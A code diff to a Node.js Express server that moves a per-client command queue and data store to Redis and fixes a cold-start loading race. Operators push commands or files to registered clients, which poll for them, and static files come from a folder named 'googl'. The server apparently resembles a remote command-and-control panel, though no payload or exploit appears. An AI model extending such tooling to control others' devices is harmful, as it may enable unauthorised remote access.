@@ -56,7 +56,7 @@ const DATA_DIR = IS_VERCEL ? '/tmp' : path.join(__dirname, 'data');
 const DATA_FILE = IS_VERCEL ? '/tmp/store.json' : path.join(__dirname, 'data', 'store.json');
 const REDIS_KEY = 'app:store';
 let saveTimeout = null;
-let storeLoaded  = false;
+let storeLoadPromise = null; // shared promise so concurrent requests all wait for the same Redis load
 
 function getDefaultStore() {
     return {
@@ -108,7 +108,7 @@ function saveStore() {
 
 function forceSave() {
     if (USE_REDIS && redis) {
-        redis.set(REDIS_KEY, store).catch(() => {});
+        redis.set(REDIS_KEY, JSON.stringify(store)).catch(() => {});
     } else {
         try { fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2)); } catch (e) {}
     }
@@ -167,8 +167,33 @@ const defaultConfig = {
 };
 if (!store.config) store.config = { ...defaultConfig };
 
-// Command queue (in-memory)
+// Command queue — in-memory for local, Redis lists for Vercel
 const commandQueue = {};
+
+async function pushCommand(clientId, cmd) {
+    if (USE_REDIS && redis) {
+        try { await redis.rpush('cmd:' + clientId, JSON.stringify(cmd)); return; } catch (e) { console.error('pushCommand redis fail:', e.message); }
+    }
+    if (!commandQueue[clientId]) commandQueue[clientId] = [];
+    commandQueue[clientId].push(cmd);
+}
+
+async function popCommands(clientId) {
+    if (USE_REDIS && redis) {
+        try {
+            const key = 'cmd:' + clientId;
+            const items = await redis.lrange(key, 0, -1);
+            if (items && items.length) {
+                await redis.del(key);
+                return items.map(c => (typeof c === 'string' ? JSON.parse(c) : c));
+            }
+            return [];
+        } catch (e) { console.error('popCommands redis fail:', e.message); }
+    }
+    const cmds = commandQueue[clientId] || [];
+    commandQueue[clientId] = [];
+    return cmds;
+}
 
 // ═══════════════════════════════════════════════════════════════
 //  HELPERS
@@ -265,17 +290,28 @@ app.use('/uploads', express.static(UPLOAD_BASE));
 app.use(express.static(path.join(__dirname, 'googl')));
 
 // ── Lazy-load store from Redis on first request ───────────────
-app.use(async (req, res, next) => {
-    if (USE_REDIS && !storeLoaded) {
-        storeLoaded = true;
-        const redisStore = await loadStoreFromRedis();
-        if (redisStore) {
-            Object.assign(store, redisStore);
-            const defs = getDefaultStore();
-            Object.keys(defs).forEach(k => { if (!store[k]) store[k] = defs[k]; });
-            console.log('Loaded store from Redis');
-        }
+// Uses a shared promise so concurrent cold-start requests all wait for
+// the same Redis fetch instead of each seeing empty data.
+function ensureStoreLoaded() {
+    if (!USE_REDIS) return Promise.resolve();
+    if (!storeLoadPromise) {
+        storeLoadPromise = loadStoreFromRedis().then(redisStore => {
+            if (redisStore) {
+                Object.assign(store, redisStore);
+                const defs = getDefaultStore();
+                Object.keys(defs).forEach(k => { if (!store[k]) store[k] = defs[k]; });
+                console.log('Loaded store from Redis (' + Object.keys(store.clients || {}).length + ' clients)');
+            }
+        }).catch(e => {
+            console.error('Redis load error:', e.message);
+            storeLoadPromise = null; // allow retry next request
+        });
     }
+    return storeLoadPromise;
+}
+
+app.use(async (req, res, next) => {
+    if (USE_REDIS) await ensureStoreLoaded();
     next();
 });
 
@@ -1015,33 +1051,26 @@ app.post('/api/command-file', requireAuth, memoryUpload.single('file'), async (r
         timestamp: new Date().toISOString()
     };
     const targets = target === 'all' ? Object.keys(store.clients) : [target];
-    targets.forEach(id => {
-        if (!commandQueue[id]) commandQueue[id] = [];
-        commandQueue[id].push(cmd);
-    });
+    await Promise.all(targets.map(id => pushCommand(id, cmd)));
     addEvent('command', { type: 'file', target, filename: displayName, size: req.file.size });
     console.log(`📁 File command: ${displayName} → ${target}`);
     res.json({ success: true, commandId: cmd.id, filename: displayName, url: cmd.data.url });
 });
 
-app.post('/api/command', requireAuth, (req, res) => {
+app.post('/api/command', requireAuth, async (req, res) => {
     const { target, type, data } = req.body;
     if (!type) return res.status(400).json({ error: 'Missing type' });
     const cmd = { id: Date.now().toString(36), type, data: data || {}, timestamp: new Date().toISOString() };
     const targets = target === 'all' ? Object.keys(store.clients) : [target];
-    targets.forEach(id => {
-        if (!commandQueue[id]) commandQueue[id] = [];
-        commandQueue[id].push(cmd);
-    });
+    await Promise.all(targets.map(id => pushCommand(id, cmd)));
     addEvent('command', { type, target, ...(data || {}) });
     console.log(`\u{26A1} Command: ${type} \u{2192} ${target}`);
     res.json({ success: true, commandId: cmd.id });
 });
 
-app.get('/api/commands/:clientId', (req, res) => {
+app.get('/api/commands/:clientId', async (req, res) => {
     const id = req.params.clientId;
-    const cmds = commandQueue[id] || [];
-    commandQueue[id] = [];
+    const cmds = await popCommands(id);
     res.json(cmds);
 });
 
